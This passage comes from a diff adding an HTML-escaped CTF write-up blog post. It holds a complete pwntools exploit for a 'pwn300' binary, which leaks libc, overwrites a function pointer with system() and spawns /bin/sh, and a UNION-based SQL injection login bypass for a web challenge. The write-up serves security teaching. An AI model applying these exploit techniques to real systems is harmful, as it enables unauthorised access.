+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in_FS_OFFSET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;cm&quot;&gt;/* WARNING: Subroutine does not return */&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;__stack_chk_fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It is possible to overwrite this function pointer by writing data into the 100th index.&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./pwn300
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1] add name
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2] print name
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3] &lt;span class=&quot;nb&quot;&gt;exit
+&lt;/span&gt;1
+index: 100
+pls give the name:
+A
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1] add name
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2] print name
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3] &lt;span class=&quot;nb&quot;&gt;exit
+&lt;/span&gt;2
+index: 100
+zsh: segmentation fault  ./pwn300
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Another thing to note is that it is possible to print out the function pointer itself if it has been unmodified, thereby leaking the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;puts()&lt;/code&gt;. The unprintable characters shown below contain the address in hexadecimal.&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./pwn300                                                                                               127 ⨯
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1] add name
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2] print name
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3] &lt;span class=&quot;nb&quot;&gt;exit
+&lt;/span&gt;2
+index: 100
+���
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1] add name
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2] print name
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3] &lt;span class=&quot;nb&quot;&gt;exit
+&lt;/span&gt;3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can open up the library in GDB to figure out the offset of &lt;code class=&quot;highlighter-rouge&quot;&gt;puts()&lt;/code&gt; and the offset of &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; from the base of libc.&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb libc-2.31.so
+GNU gdb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian 10.1-1.4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 10.1
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+
+gef➤  info functions puts
+All functions matching regular expression &lt;span class=&quot;s2&quot;&gt;&quot;puts&quot;&lt;/span&gt;:
+
+Non-debugging symbols:
+0x0000000000085e60  _IO_fputs
+0x0000000000085e60  fputs
+0x00000000000875a0  _IO_puts
+0x00000000000875a0  puts
+0x00000000000914a0  fputs_unlocked
+0x00000000001273c0  putspent
+0x0000000000129090  putsgent
+gef➤  info functions system
+All functions matching regular expression &lt;span class=&quot;s2&quot;&gt;&quot;system&quot;&lt;/span&gt;:
+
+Non-debugging symbols:
+0x0000000000055410  __libc_system
+0x0000000000055410  system
+0x0000000000156a80  svcerr_systemerr
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can write some Python code to calculate the base of libc by subtracting &lt;code class=&quot;highlighter-rouge&quot;&gt;0x875a0&lt;/code&gt; from the leaked address of &lt;code class=&quot;highlighter-rouge&quot;&gt;puts()&lt;/code&gt;. Then we can calculate the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; by adding &lt;code class=&quot;highlighter-rouge&quot;&gt;0x55410&lt;/code&gt; to that value.&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Open the process
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;LD_PRELOAD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;./libc-2.31.so&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./pwn300&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# gdb.attach(p, &quot;b *print_name+143\nc\nc&quot;)
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Ignore first few lines
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Leak the address of puts() and calculate offsets
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;100&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;puts_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;puts_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[::&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;libc_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x875a0&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x55410&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now how do we pass in the input parameters? Using a ROP chain to POP the address of a &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; string did not work when I tried it because only one address on the stack gets overwritten. Instead, if we look back at the line of code in Ghidra that executes the function pointer, we can see that the string inside of the buffer we’re currently using is always going to be used as an input parameter for the program.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;names&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_10000_8_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;names&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ulong&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In other words, suppose we were to write “/bin/sh” into the 99th index of the array. Then we could use the “print name” option on the 99th index to call our function pointer, which should be overwritten with the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt;. Since this line of code should use whatever we’ve written into the 99th index of the array, we will therefore be able to call &lt;code class=&quot;highlighter-rouge&quot;&gt;system(&quot;/bin/sh&quot;)&lt;/code&gt; and get a shell!&lt;/p&gt;
+
+&lt;p&gt;Here is the code that does just that:&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Open the process
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;LD_PRELOAD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;./libc-2.31.so&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./pwn300&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Ignore first few lines
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Leak the address of puts() and calculate offsets
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;100&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;puts_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;puts_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[::&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;libc_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x875a0&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x55410&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Set the function parameters
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;99&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Overwrite puts() pointer and execute
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;100&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;99&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This will give the attacker a shell.&lt;/p&gt;
+
+&lt;h3 id=&quot;rookie-mistake&quot;&gt;Rookie Mistake&lt;/h3&gt;
+&lt;p&gt;In this web challenge, we are presented with a basic login screen.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto; width: 50%; height: 50%;&quot; src=&quot;../../../assets/img/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/rookiemistake1.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I tried typing in a double quotation mark character (“) into the login prompt.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto; width: 50%; height: 50%;&quot; src=&quot;../../../assets/img/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/rookiemistake2.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;When I did this, I was presented with the text shown below, meaning that this is likely vulnerable to a SQL injection.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto; width: 50%; height: 50%;&quot; src=&quot;../../../assets/img/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/rookiemistake3.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The organizers of the CTF also gave us the following hint for this challenge:&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto; width: 50%; height: 50%;&quot; src=&quot;../../../assets/img/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/rookiemistake4.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Based on this message, we know that the SQL query that gets sent through the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; parameter is in the form:&lt;/p&gt;
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sha256pwdhash&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;login&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;{}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;What if we were to slightly modify this SQL query so that it would return a SHA256 hash that we type in? I looked up the SHA256 hash for the empty string, and it was &lt;code class=&quot;highlighter-rouge&quot;&gt;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855&lt;/code&gt;. With this knowledge, I wrote &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;union select &quot;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855&quot;--&lt;/code&gt; into the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; parameter. This meant that the entire SQL query would become&lt;/p&gt;
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sha256pwdhash&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;login&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;&quot;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855&quot;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;--&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In other words, I am adding the SHA256 hash for the empty string into the result for the SQL query.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto; width: 50%; height: 50%;&quot; src=&quot;../../../assets/img/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/rookiemistake5.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The next page showed the following text.
+&lt;img style=&quot;margin-left: auto; margin-right: auto; width: 50%; height: 50%;&quot; src=&quot;../../../assets/img/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/rookiemistake6.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;To login as administrator, I needed the &lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt; parameter of the SQL query to be equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;administrator&lt;/code&gt;. This meant that my SQL query had to look more like this:&lt;/p&gt;
